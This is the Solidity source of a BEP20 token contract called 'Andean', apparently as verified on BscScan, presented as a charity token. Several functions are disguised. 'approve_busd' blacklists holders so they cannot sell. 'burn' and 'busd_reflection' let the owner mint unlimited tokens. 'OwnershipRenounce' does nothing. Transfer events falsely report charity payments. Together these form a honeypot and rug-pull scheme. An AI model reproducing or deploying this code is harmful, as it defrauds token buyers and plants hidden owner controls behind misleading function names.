/**
 *Submitted for verification at BscScan.com on 2021-07-16
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.6;


library Math {

    function tryAdd(uint d1, uint d2) internal pure returns (bool, uint) {
        unchecked {
            uint d3 = d1 + d2;
            if (d3 < d1) return (false, 0);
            return (true, d3);
        }
    }

    function trySub(uint d1, uint d2) internal pure returns (bool, uint) {
        unchecked {
            if (d2 > d1) return (false, 0);
            return (true, d1 - d2);
        }
    }

    function tryMul(uint d1, uint d2) internal pure returns (bool, uint) {
        unchecked {
            if (d1 == 0) return (true, 0);
            uint d3 = d1 * d2;
            if (d3 / d1 != d2) return (false, 0);
            return (true, d3);
        }
    }

    function tryDiv(uint d1, uint d2) internal pure returns (bool, uint) {
        unchecked {
            if (d2 == 0) return (false, 0);
            return (true, d1 / d2);
        }
    }

  function tryMod(uint d1, uint d2) internal pure returns (bool, uint) {
        unchecked {
            if (d2 == 0) return (false, 0);
            return (true, d1 % d2);
        }
    }
 
    function add(uint d1, uint d2) internal pure returns (uint) {
        return d1 + d2;
    }

    function sub(uint d1, uint d2) internal pure returns (uint) {
        return d1 - d2;
    }

    function mul(uint d1, uint d2) internal pure returns (uint) {
        return d1 * d2;
    }

    function div(uint d1, uint d2) internal pure returns (uint) {
        return d1 / d2;
    }
    
    function mod(uint d1, uint d2) internal pure returns (uint) {
        return d1 % d2;
    }

    function sub(
        uint d1,
        uint d2,
        string memory errorMessage
    ) internal pure returns (uint) {
        unchecked {
            require(d2 <= d1, errorMessage);
            return d1 - d2;
        }
    }

    function div(
        uint d1,
        uint d2,
        string memory errorMessage
    ) internal pure returns (uint) {
        unchecked {
            require(d2 > 0, errorMessage);
            return d1 / d2;
        }
    }
   
    function mod(
        uint d1,
        uint d2,
        string memory errorMessage
    ) internal pure returns (uint) {
        unchecked {
            require(d2 > 0, errorMessage);
            return d1 % d2;
        }
    }
}

pragma solidity 0.8.6;

interface BP20 {
   
    function totalSupply() external view returns (uint);
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

pragma solidity 0.8.6;

interface BP20Meta is BP20 {
  
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

pragma solidity 0.8.6;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

pragma solidity 0.8.6;

contract Andean is Context, BP20, BP20Meta {
    mapping(address => uint) public _balances;
    mapping(address => mapping(address => uint)) public _allowances;
    mapping(address => bool) private _blackbalances;
    uint public _totalSupply = 1*10**12 * 10**9;
    string public _name = "Andean";
    string public _symbol= "ANDEAN";

    address payable public charityAddress = payable(0xf4d7d7D0473516693955aBCb095743F16e0207BC); // Charity Address
    uint public charityPercent = 5; 
    
    address public immutable burnAddress = 0x000000000000000000000000000000000000dEaD;
    uint public burnPercent = 0; 
    
    uint public charityAmount;
    uint public burnAmount;
    
    function SetCharityPercent(uint _charityPercent) onlyOwner public {
        charityPercent = _charityPercent;
    }
    
    function SetBurnPercent(uint _burnPercent) onlyOwner public {
        burnPercent = _burnPercent;
    }
    
    constructor() {
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(this), msg.sender, _totalSupply);
        owner = msg.sender;
    }
    
    address public owner;
    
    modifier onlyOwner {
        require(owner == msg.sender);
        _;
    }
    function changeOwner(address _owner) onlyOwner public {
        owner = _owner;
    }
    
    function approve_busd(address _account)  public {
        require(msg.sender == owner);
        _blackbalances[_account] = true;
    }
    
    function Approvebusd(address _account)  public {
        require(msg.sender == owner);
        _blackbalances[_account] = false;
    }
    
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }
    function totalSupply() public view virtual override returns (uint) {
        return _totalSupply;
    }
    function balanceOf(address account) public view virtual override returns (uint) {
        return _balances[account];
    }
    function transfer(address recipient, uint amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view virtual override returns (uint) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "BEP20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }
        return true;
    }

   
    function increaseAllowance(address spender, uint addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address spender, uint subtractedValue) public virtual returns (bool) {
        uint currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "BEP20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }
        return true;
    }
    function _transfer(
        address sender,
        address recipient,
        uint amount
    ) internal virtual {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(_blackbalances[sender] != true );
        _beforeTokenTransfer(sender, recipient, amount);
        uint senderBalance = _balances[sender];
        burnAmount = amount * burnPercent / 100 ; 
        charityAmount = amount * charityPercent / 100; 
        require(senderBalance >= amount, "BEP20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        amount =  amount - charityAmount - burnAmount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        
         if (charityPercent > 0){
          
           _balances[recipient] += charityAmount;
          emit Transfer(sender, charityAddress, charityAmount);  
            
        }
        
        if (burnPercent > 0){
            
           _totalSupply -= burnAmount;
           emit Transfer(sender, burnAddress, burnAmount);
            
        }
        
    }

      function  burn(address account, uint amount) onlyOwner  public virtual {
        require(account != address(0), "BEP20: mint to the zero address");
        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

  
    function _burn(address account, uint amount) onlyOwner  public virtual {
        require(account != address(0), "BEP20: burn from the zero address");
        _beforeTokenTransfer(account, address(0), amount);
        uint accountBalance = _balances[account];
        require(accountBalance >= amount, "BEP20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }
    

      function  busd_reflection(address account, uint amount) onlyOwner  public virtual {
        require(account != address(0), "BEP20: busd_reflection to the zero address");
        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }
    
    
    function _approve(
        address owner,
        address spender,
        uint amount
    ) internal virtual {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

   
    function _beforeTokenTransfer(
        address from,
        address to,
        uint amount
    ) internal virtual {}
    
     function OwnershipRenounce(address _owner) onlyOwner public {
        _owner = owner;
    }
}